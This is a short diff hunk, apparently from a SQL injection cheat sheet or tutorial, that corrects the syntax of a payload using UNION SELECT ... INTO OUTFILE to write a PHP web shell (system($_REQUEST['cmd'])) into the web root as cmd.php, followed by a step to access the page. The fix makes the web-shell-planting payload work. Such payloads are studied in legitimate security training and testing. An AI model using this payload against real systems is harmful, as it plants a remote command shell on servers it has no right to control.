@@ -34,7 +34,7 @@ Use the INTO FILE to create a php file in the web server
 
 ```
 SELECT * FROM users WHERE username = 'a' 
-UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL; INTO OUTFILE 'var/www/cmd.php'--' AND password = ''
+UNION SELECT “<? system($_REQUEST[‘cmd’]); ?>”, NULL INTO OUTFILE 'var/www/cmd.php';--' AND password = ''
 ```
 
 Access the web page 
